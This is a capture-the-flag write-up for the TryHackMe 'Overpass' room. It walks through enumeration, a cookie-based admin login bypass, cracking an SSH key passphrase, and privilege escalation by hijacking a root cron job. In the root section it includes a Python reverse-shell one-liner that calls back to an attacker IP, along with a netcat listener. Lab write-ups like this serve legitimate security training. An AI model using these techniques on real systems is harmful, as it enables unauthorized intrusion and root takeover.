Let’s take a look at the [Overpass CTF](https://tryhackme.com/room/overpass) on TryHackMe.

## Enumeration
### Nmap Scan
The first step of my enumeration was a scan with **nmap**. by the command:

```
sudo nmap 10.10.184.21 -sC -sS -Pn
```
The “Nmap Output” displayed `2` services running under port 80 and 22 you guessed it's HTTP and SSH.

Connecting to the HTTP port in a browser shows a web page that showcase the password manager tool

### Gobuster Scan
I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:

```
gobuster dir -u http://10.10.184.21/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php
```

## Exploring 
So I found there was a hidden admin page at `/admin`. I tried some default password like `admin@admin` etc then I decided to take a look at the source code to observe how the login works
![Login](/images/Overpass/loginjs.jpg)

## Exploiting
The function login() in the `login.js` script get 3 the username, the password and the loginStatus then assemble the credentials into a JS Object called `creds` and sends them to `/api/login` for validation then it checks if the credentials are valid, If the credentials are incorrect, it displays "Incorrect Credentials," but if they are correct, It saves a SessionToken cookie and redirects the user to /admin. So I decided to add a cookie with a random value using the web developer bar:

## User Flag
When I refresh the page we get a note to James and a SSH key, So I copy it and stores it in a file called `id_rsa`

> Don't forget to change the permission of the file:

```
chmod 600 id_rsa
```

![PassPhrase](/images/Overpass/passphrase.jpg)

When I tried to login I got a passphrase to enter, So let's crack it using **John the Ripper**:

```
python ssh2john.py /home/kali/id_rsa > /home/kali/hash
```

```
john /home/kali/hash
```

After brute-forcing the ssh private key passphrase. Now we can log in via SSH:
![In](/images/Overpass/in.jpg)

And we found the user Flag:

```
thm**********************************
```

## Root Flag
In the same directory we found a todo file:
![ToDo](/images/Overpass/todo.jpg)

So in the last task they mentionned an automated script, and I though of cron and crontab:

The software utility cron also known as **cron** job is a time-based job scheduler in Unix-like computer operating systems. And here's a [link](https://opensource.com/article/17/11/how-use-cron-linux) that teaches you how to use cron in Linux.

Analyzing the crontab file reveals that root runs `buildscript.sh` every minute: 
![Cron](/images/Overpass/crontab.jpg)

So let's try to edit the ip address from `/etc/hosts` and try to create a local reverse shell :

First of all I created a file in my local machine it's called `downloads/src/buildscript.sh` that have:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.174.180",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Then I started a local web server in the same port of Overpass 80 with Python:

```
sudo python3 -m http.server 80 
```

And I launched a netcat listener:

```
nc -nlvp 4444
```

Finally, we were able to connect to the Box as root and we found the root flag:

```
thm**********************************
```
